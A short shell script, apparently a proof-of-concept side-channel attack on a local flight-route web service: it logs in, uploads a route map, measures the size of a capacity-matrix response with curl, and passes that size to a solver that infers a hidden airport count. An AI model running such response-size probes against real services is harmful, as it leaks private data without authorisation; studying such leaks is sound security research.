#!/bin/sh

./login.sh usr pwd

# upload a route map
curl -s -L -b cookies.txt -F file=@user.txt -F "route_map_name=user" --insecure https://localhost:8443/add_route_map > /dev/null

user=`curl -s -b cookies.txt --insecure https://localhost:8443/passenger_capacity_matrix/1553932502 -w '%{size_download}\n' | tail -n1`

echo "User response= $user"
solution=`./solve.py $user`
echo "Hacker side-channel using formula (34-sqrt(34*34+4*10*(user-3163)))/(-2*10) = $solution airports"
